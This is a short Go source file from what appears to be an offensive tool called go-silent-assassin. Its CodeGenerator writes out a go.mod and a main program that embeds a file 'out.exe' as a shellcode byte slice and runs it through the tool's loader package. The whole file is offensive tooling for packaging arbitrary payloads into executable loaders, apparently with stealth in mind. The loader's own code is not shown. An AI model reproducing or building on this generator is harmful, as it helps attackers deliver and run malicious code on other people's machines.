package codegen

type CodeGenerator struct {
}

func NewCodeGenerator() *CodeGenerator {
	return &CodeGenerator{}
}

func (c *CodeGenerator) GenerateLoaderGoModFile() []byte {
	return []byte(`
module loader

go 1.16

require (
	github.com/jpiechowka/go-silent-assassin latest
)

`)
}

// TODO: out.exe make configurable
func (c *CodeGenerator) GenerateDefaultCode() []byte {
	return []byte(`
package main

import (
	_ "embed"
	"os"

	"github.com/jpiechowka/go-silent-assassin/pkg/loader"
)

//go:embed out.exe
var shellcode []byte

func main() {
	l := loader.NewLoader(shellcode)
	err := l.Execute()
	if err != nil {
		os.Exit(1)
	}
	
	os.Exit(0)
}
`)
}
